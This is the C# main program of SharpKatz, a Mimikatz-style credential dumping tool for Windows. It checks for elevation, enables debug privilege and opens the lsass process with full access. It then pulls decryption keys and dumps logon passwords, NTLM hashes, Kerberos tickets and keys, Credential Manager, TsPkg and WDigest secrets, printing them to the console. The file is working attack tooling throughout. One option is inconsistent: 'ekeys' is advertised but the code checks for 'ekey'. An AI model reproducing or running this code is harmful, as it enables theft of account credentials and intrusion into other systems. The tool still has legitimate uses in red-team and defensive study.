using SharpKatz.Credential;
using SharpKatz.Module;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using NDesk.Options;

namespace SharpKatz
{
    class Program
    {
        static void Main(string[] args)
        {

            string command = null;

            bool showhelp = false;

            OptionSet opts = new OptionSet()
            {
                { "Command=", "--Command logonpasswords,ekeys,msv,kerberos,tspkg,credman,wdigest", v => command = v },
                { "h|?|help",  "Show available options", v => showhelp = v != null },
            };

            try
            {
                opts.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            if (showhelp)
            {
                opts.WriteOptionDescriptions(Console.Out);
                Console.WriteLine();
                Console.WriteLine("[*] Example: SharpKatz.exe --Command logonpasswords");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command ekeys");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command msv");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command kerberos");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command tspkg");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command credman");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command wdigest");
                return;
            }

            if (string.IsNullOrEmpty(command))
                command = "logonpasswords";

            if (IntPtr.Size != 8)
            {
                return;
            }

            if (!Utility.IsElevated())
            {
                Console.WriteLine("Run in High integrity context");
                return;
            }

            Utility.SetDebugPrivilege();

            OSVersionHelper osHelper = new OSVersionHelper();
            osHelper.PrintOSVersion();

            IntPtr lsasrv = IntPtr.Zero;
            IntPtr wdigest = IntPtr.Zero;
            IntPtr lsassmsv1 = IntPtr.Zero;
            IntPtr kerberos = IntPtr.Zero;
            IntPtr tspkg = IntPtr.Zero;
            IntPtr lsasslive = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;
            Process plsass = Process.GetProcessesByName("lsass")[0];

            ProcessModuleCollection processModules = plsass.Modules;

            for(int i = 0; i < processModules.Count; i++ )
            {
                if (processModules[i].ModuleName.ToLower().Contains("lsasrv.dll"))
                {
                    lsasrv = processModules[i].BaseAddress;
                }
                if (processModules[i].ModuleName.ToLower().Contains("wdigest.dll"))
                {
                    wdigest = processModules[i].BaseAddress;
                }
                if (processModules[i].ModuleName.ToLower().Contains("msv1_0.dll"))
                {
                    lsassmsv1 = processModules[i].BaseAddress;
                }
                if (processModules[i].ModuleName.ToLower().Contains("kerberos.dll"))
                {
                    kerberos = processModules[i].BaseAddress;
                }
                if (processModules[i].ModuleName.ToLower().Contains("tspkg.dll"))
                {
                    tspkg = processModules[i].BaseAddress;
                }
                if (processModules[i].ModuleName.ToLower().Contains("livessp.dll"))
                {
                    lsasslive = processModules[i].BaseAddress;
                }

            }

            hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);

            List<Logon> logonlist = new List<Logon>();

            Keys keys = new Keys(hProcess, lsasrv, osHelper);
            
            Module.LogonSessions.FindCredentials(hProcess, lsasrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

            if(command.Equals("logonpasswords") || command.Equals("msv"))
                Module.Msv1.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

            if (command.Equals("logonpasswords") || command.Equals("credman"))
                Module.CredMan.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

            if (command.Equals("logonpasswords") || command.Equals("tspkg"))
                Module.Tspkg.FindCredentials(hProcess, tspkg, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

            if (command.Equals("logonpasswords") || command.Equals("kerberos") || command.Equals("ekeys"))
            {
                List<byte[]> klogonlist = Module.Kerberos.FindCredentials(hProcess, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                if (command.Equals("logonpasswords") || command.Equals("kerberos"))
                    foreach (byte[] p in klogonlist)
                        Module.Kerberos.GetCredentials(ref hProcess, p, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                if (command.Equals("ekey"))
                    foreach (byte[] p in klogonlist)
                        Module.Kerberos.GetKerberosKeys(ref hProcess, p, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
            }

            if (command.Equals("logonpasswords") || command.Equals("wdigest"))
                WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

            Utility.PrintLogonList(logonlist);

        }
    }
}
